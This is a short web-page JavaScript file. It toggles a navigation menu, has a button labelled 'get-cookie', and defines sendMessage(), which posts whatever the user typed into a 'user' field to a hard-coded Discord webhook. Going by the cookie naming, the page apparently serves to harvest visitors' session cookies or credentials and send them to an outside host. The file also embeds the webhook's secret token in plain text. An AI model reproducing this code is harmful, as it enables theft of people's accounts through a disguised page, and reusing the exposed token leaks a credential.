let bar = document.querySelector('.bars'),
navItem = document.querySelector('.nav-items');

bar.addEventListener('click', () => {
    navItem.classList.toggle('active');
})




let cookie = document.getElementById("user")
let getCookie = document.getElementById("get-cookie")

getCookie.addEventListener("click", function() {
})




function sendMessage() {
    
    const inputText = document.getElementById("user").value
    const webhookUrl = "https://discord.com/api/webhooks/1178787648551268372/fuPb-civfvC-DsUt4SE7AEgVlvELH0_lL4UacDuKQOj66CVhEmnwcHSRExNcm_tjXbxe";

    const payload = {
      content: inputText
    };
  
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Failed to send message to Discord");
      }
    })
    .catch(error => {
      console.error(error);
    });
}